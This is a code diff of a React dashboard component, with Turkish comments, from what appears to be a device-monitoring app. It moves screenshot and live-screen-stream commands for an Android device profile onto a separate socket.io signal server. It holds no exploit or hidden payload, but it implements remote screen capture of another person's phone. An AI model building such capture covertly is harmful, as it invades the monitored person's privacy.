@@ -19,6 +19,7 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
   const [screenshots, setScreenshots] = useState([]);
   const [loading, setLoading] = useState(false);
   const [socket, setSocket] = useState(null);
+  const [signalSocket, setSignalSocket] = useState(null);
 
   // ── Canlı Akış State ──────────────────────────────────────────────────────
   const [streaming, setStreaming] = useState(false);
@@ -31,6 +32,7 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
   useEffect(() => {
     fetchScreenshots();
 
+    // Backend socket (port 8000) — yeni screenshot bildirimi için
     const newSocket = io(backendUrl);
     setSocket(newSocket);
 
@@ -38,16 +40,32 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
       if (data.profileId === profileId) fetchScreenshots();
     });
 
-    // Canlı kare akışı
-    newSocket.on("screen_frame", (data) => {
+    // Signal server (port 8001) — komut göndermek için
+    const signalUrl = backendUrl.replace(":8000", ":8001");
+    const newSignalSocket = io(signalUrl, { transports: ["websocket"] });
+    setSignalSocket(newSignalSocket);
+
+    newSignalSocket.on("connect", () => {
+      console.log("[LiveScreenshots] Signal server bağlandı:", signalUrl);
+      newSignalSocket.emit("register", "dashboard");
+    });
+    newSignalSocket.on("connect_error", (err) => {
+      console.error(
+        "[LiveScreenshots] Signal server bağlantı hatası:",
+        err.message,
+      );
+    });
+
+    // Canlı kare — signal server relay'inden gelir
+    newSignalSocket.on("screen_frame", (data) => {
       if (data.profileId === profileId && data.frame) {
         setLiveFrame(`data:image/jpeg;base64,${data.frame}`);
         setStreamError(null);
       }
     });
 
-    // Ekran izni hatası — Android'den gelir
-    newSocket.on("screen_stream_error", (data) => {
+    // Ekran izni hatası — Android'den signal server üzerinden gelir
+    newSignalSocket.on("screen_stream_error", (data) => {
       setStreamError(data?.error || "Ekran akışı başlatılamadı.");
       setStreaming(false);
     });
@@ -89,7 +107,8 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
     }
 
     return () => {
-      newSocket.emit("stop_screen_stream", { profileId });
+      newSignalSocket.emit("command", { type: "stop", profileId });
+      newSignalSocket.close();
       newSocket.close();
       if (supabaseChannel) supabase.removeChannel(supabaseChannel);
     };
@@ -113,17 +132,11 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
     }
   };
 
-  const takeScreenshot = async () => {
+  const takeScreenshot = () => {
+    if (!signalSocket) return;
     setLoading(true);
-    try {
-      await apiFetch(`${backendUrl}/api/screenshots/take/${profileId}`, {
-        method: "POST",
-      });
-      setTimeout(() => setLoading(false), 2000);
-    } catch (err) {
-      console.error("Command error:", err);
-      setLoading(false);
-    }
+    signalSocket.emit("command", { type: "photo", profileId });
+    setTimeout(() => setLoading(false), 2000);
   };
 
   // ── Supabase Realtime Broadcast — "kare hazır" sinyali ───────────────────
@@ -151,16 +164,16 @@ const LiveScreenshots = ({ profileId, backendUrl }) => {
 
   // ── Canlı Akış Kontrol ────────────────────────────────────────────────────
   const startStream = () => {
-    if (!socket) return;
-    socket.emit("request_screen_stream", { profileId });
+    if (!signalSocket) return;
+    signalSocket.emit("command", { type: "screen", profileId });
     setStreaming(true);
     setLiveFrame(null);
     setStreamError(null);
   };
 
   const stopStream = () => {
-    if (!socket) return;
-    socket.emit("stop_screen_stream", { profileId });
+    if (!signalSocket) return;
+    signalSocket.emit("command", { type: "stop", profileId });
     setStreaming(false);
   };
 
